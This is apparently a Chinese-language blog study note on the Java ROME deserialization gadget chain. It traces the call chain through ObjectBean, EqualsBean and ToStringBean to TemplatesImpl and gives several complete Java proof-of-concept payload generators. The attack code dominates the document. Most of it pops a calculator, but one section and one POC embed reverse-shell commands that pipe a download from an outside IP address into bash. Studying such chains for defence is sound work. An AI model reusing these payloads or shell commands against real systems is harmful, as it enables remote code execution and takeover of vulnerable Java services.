# 环境搭建

```xml
<dependency>
            <groupId>rome</groupId>
            <artifactId>rome</artifactId>
            <version>1.0</version>
        </dependency>
        <dependency>
            <groupId>org.javassist</groupId>
            <artifactId>javassist</artifactId>
            <version>3.28.0-GA</version>
        </dependency>
```

# 漏洞复现

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME 'open /System/Applications/Calculator.app' | base64
```

将输出的base64放到下面的exp中

```
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.util.Base64;

public class TestRome {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        String base64_exp = "base64";
        byte[] exp = Base64.getDecoder().decode(base64_exp);
        ByteArrayInputStream bytes = new ByteArrayInputStream(exp);
        ObjectInputStream objectInputStream = new ObjectInputStream(bytes);
        objectInputStream.readObject();
    }
}
```

![image-20221123104349392](images/1.png)

# 漏洞分析

调用链如下

 * TemplatesImpl.getOutputProperties()
 * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
 * NativeMethodAccessorImpl.invoke(Object, Object[])
 * DelegatingMethodAccessorImpl.invoke(Object, Object[])
 * Method.invoke(Object, Object...)
 * ToStringBean.toString(String)
 * ToStringBean.toString()
 * ObjectBean.toString()
 * EqualsBean.beanHashCode()
 * ObjectBean.hashCode()
 * HashMap<K,V>.hash(Object)
 * HashMap<K,V>.readObject(ObjectInputStream)

我们重点关注ObjectBean，EqualsBean，ToStringBean这三个类

ObjectBean，这个类提供了一个hashCode和toString方法，还有三个类成员变量

![image-20221123113002806](images/2.png)

![image-20221123105857955](images/3.png)

![image-20221123112935034](images/4.png)

跟进这里的beanHashCode

![image-20221123113715498](images/5.png)

此时的_obj是ObjectBean

所以这里也回到了ObjectBean的toString

![image-20221123113924507](images/6.png)

跟进toStringBean的toString

![image-20221123114002486](images/7.png)

看看这个类的构造方法

![image-20221123114029046](images/8.png)

beanClass和obj是我们可控的

这里根据ysoserial打过来的payload传入的obj是TemplatesImpl类，通过截取后prefix就是TemplatesImpl

跟进toString，这里就是一个重点地方了，通过这里去调用了TemplatesImpl的getOutputProperties方法

![image-20221123120530396](images/9.png)

这个getPropertyDescriptors获取`_beanClass`所有的getter和setter方法

在获取完任意 getter 方法后，做了一系列基本的判断 ———— 确保 getter 方法不为空，确保能够调用类的 getter 方法，确保里面可以传参，这后面注释也写的很清楚

完成判断后，执行

```java
Object value = pReadMethod.invoke(_obj,NO_PARAMS);
```

来到了TemplatesImpl的getOutputProperties方法

![image-20221123132856136](images/10.png)

接下来就是熟悉的加载字节码了

至于hashCode方法，在学习CC6的时候，可以知道可以从hashtable或者hashmap调用到这里的hashCode方法

# poc编写

## POC1

```
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;

public class Test {
    public static void main(String[] args) throws Exception{
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass("a");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\");";
        ctClass.makeClassInitializer().insertBefore(cmd);
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        byte[] bytes = ctClass.toBytecode();
        byte[][] bytes1 = new byte[][]{bytes};

        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", bytes1);
        setFieldValue(templates, "_name", "DawnT0wn");
        setFieldValue(templates, "_class", null);

        ObjectBean objectBean1 = new ObjectBean(Templates.class,templates);
        ObjectBean objectBean2 = new ObjectBean(Object.class,objectBean1);

        HashMap hashMap = new HashMap();
        hashMap.put(objectBean2,"DawnT0wn");
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashMap);
        Base64.Encoder base = Base64.getEncoder();
        System.out.println(base.encodeToString(byteArrayOutputStream.toByteArray()));

    }
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}
```

输出的base64放到下面exp中

```
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.util.Base64;

public class TestRome {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        String base64_exp = "base64";
        byte[] exp = Base64.getDecoder().decode(base64_exp);
        ByteArrayInputStream bytes = new ByteArrayInputStream(exp);
        ObjectInputStream objectInputStream = new ObjectInputStream(bytes);
        objectInputStream.readObject();
    }
}
```

既然要调用到toString，在CC5中，我们知道可以去调用任意的toString

## POC2

```
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import javassist.ClassPool;
import javassist.CtClass;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;

public class Test {
    public static void main(String[] args) throws Exception{
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass("a");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\");";
        ctClass.makeClassInitializer().insertBefore(cmd);
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        byte[] bytes = ctClass.toBytecode();
        byte[][] bytes1 = new byte[][]{bytes};

        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", bytes1);
        setFieldValue(templates, "_name", "DawnT0wn");
        setFieldValue(templates, "_class", null);

        ObjectBean objectBean = new ObjectBean(Templates.class,templates);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("");
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException,objectBean);
        
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(badAttributeValueExpException);
        Base64.Encoder base = Base64.getEncoder();
        String base64 = base.encodeToString(byteArrayOutputStream.toByteArray());
        System.out.println(base64);
        System.out.println(base64.length());
    }
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}
```

## POC3

通过XString的toString方法

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.Hashtable;


public class Rome {

    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = GetTemplatesImpl.getTemplatesImpl();

        XString xString = new XString("");
        ToStringBean toStringBean = new ToStringBean(Templates.class,templates);

        Hashtable hashtable1 = new Hashtable();
        Hashtable hashtable2 = new Hashtable();
        hashtable1.put("aa",toStringBean);
        hashtable1.put("bB",xString);
        hashtable2.put("aa",xString);
        hashtable2.put("bB",toStringBean);
        Hashtable hashtable = new Hashtable();
        hashtable.put(hashtable1,"");
        hashtable.put(hashtable2,"");


        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashtable);
        System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));

        System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())).length());
    }
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

}
```

剩下的类也是Y4的一样，在下面有

# ROME链缩短

## EqualBean的equals方法

这里是Y4的博客https://y4tacker.github.io/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#Step1%E2%80%93%E6%94%B9%E9%80%A0%E5%88%A9%E7%94%A8%E9%93%BE

通过HashMap中的equals调用到了EqualBean的equals方法

Rome.java

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Hashtable;


public class Rome {

    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = GetTemplatesImpl.getTemplatesImpl();
        EqualsBean bean = new EqualsBean(String.class,"");
//        HashMap map1 = new HashMap();
//        HashMap map2 = new HashMap();
//        map1.put("aa",templates);
//        map1.put("bB",bean);
//        map2.put("aa",bean);
//        map2.put("bB",templates);
//        HashMap map = new HashMap();
//        map.put(map1,"");
//        map.put(map2,"");
        Hashtable hashtable1 = new Hashtable();
        Hashtable hashtable2 = new Hashtable();
        hashtable1.put("aa",templates);
        hashtable1.put("bB",bean);
        hashtable2.put("aa",bean);
        hashtable2.put("bB",templates);
        Hashtable hashtable = new Hashtable();
        hashtable.put(hashtable1,"");
        hashtable.put(hashtable2,"");

        setFieldValue(bean,"_beanClass",Templates.class);
        setFieldValue(bean,"_obj",templates);


        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashtable);
        System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));

        System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())).length());
    }
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

}
```

GetTemplatesImpl.java

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.lang.reflect.Field;

public class GetTemplatesImpl {
    public static TemplatesImpl getTemplatesImpl() throws Exception{

        byte[][] bytes = new byte[][]{GenerateEvilByJavaassist.generate()};



        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setValue(templates, "_bytecodes", bytes);
        setValue(templates, "_name", "1");
        setValue(templates, "_tfactory", null);


        return  templates;
    }

    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

GenerateEvilByJavaassist.java

```
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

public class GenerateEvilByJavaassist {
    public static byte[] generate() throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("Runtime.getRuntime().exec(\"open -na Calculator\");");
        clazz.addConstructor(constructor);
        return clazz.toBytecode();
    }
}

反弹shell的话用bash -c {echo,Y3VybCA0Ny45My4yNDguMjIx772cYmFzaA==}|{base64,-d}|{bash,-i}
最小的命令：Runtime.getRuntime().exec("/bin/bash -c curl${IFS}47.93.248.221|bash");
```

至于为什么要这样去写（这里的前提是aa和bB的hashcode相同）

```
HashMap map1 = new HashMap();
HashMap map2 = new HashMap();
map1.put("aa",templates);
map1.put("bB",bean);
map2.put("aa",bean);
map2.put("bB",templates);
HashMap map = new HashMap();
map.put(map1,"");
map.put(map2,"");
```

首先，我们知道，当key相同的时候会去调用equals方法，但是呢，是需要前提条件的，hashMap和hashTable一样，我们put了两个对象，拿hashTable举例

![image-20230311191858275](images/11.png)

这里我们虽然会去获取上一个添加进来的entry，但是同样要去得到一个index，如果只添加一个值，tab[index]仍然为空，是不会进入到调用equals方法的地方

然后为什么要这样对应呢，原因是，hashmap很巧的是在HashMap的equals方法当中,当对象大于1时会转而调用父类`java.util.AbstractMap#equals`

![image-20230311192159975](images/12.png)

这里是跟进第二次put进来的hashmap调用的，所以value需要是EqualsBean对象，而第一个相对应的则是TemplatesImpl对象

所以有了

```
map1.put("aa",templates);
map2.put("aa",bean);
```

这里是相对应的（还要注意顺序，都是第一个put，因为只会调用一次AbstractMap），顺序是跟进map2的aa来看的（即value.equals）

## EqualBean的hashCode

这条链子要稍微比Y4的长几十

```
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.Hashtable;

public class Test {
    public static void main(String[] args) throws Exception{

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("Runtime.getRuntime().exec(\"bash -c {echo,Y3VybCA0Ny45My4yNDguMjIx772cYmFzaA==}|{base64,-d}|{bash,-i}\");");
        clazz.addConstructor(constructor);
        byte[][] bytes1 = new byte[][]{clazz.toBytecode()};

        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", bytes1);
        setFieldValue(templates, "_name", "DawnT0wn");
        setFieldValue(templates, "_class", null);

        ToStringBean toStringBean = new ToStringBean(Templates.class,templates);
        EqualsBean equalsBean = new EqualsBean(Object.class,toStringBean);

        Hashtable hashtable = new Hashtable();
        hashtable.put(equalsBean,"a");
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashtable);
        Base64.Encoder base = Base64.getEncoder();
        String base64 = base.encodeToString(byteArrayOutputStream.toByteArray());
        System.out.println(base64);
        System.out.println(base64.length());
    }
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}
```

# 写在最后

其实rome和CC的区别就是在于那几个Bean，这几个bean中equalBean的beanEquals和ToStringBean的toString都可以去调用到TemplatesImp方法，还有就是对hashCode或者toString方法对调用，以及Y4对equals方法对调用



参考链接：

https://www.yulate.com/292.html

https://y4tacker.github.io/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#%E6%9C%80%E7%BB%88%E4%BB%A3%E7%A0%81

[Java反序列化之ROME链 | 芜风 (drun1baby.github.io)](https://drun1baby.github.io/2022/10/10/Java反序列化之ROME链/#toc-heading-15)

[Java---Rome链学习 - o3Ev的小家](http://blog.o3ev.cn/yy/1619)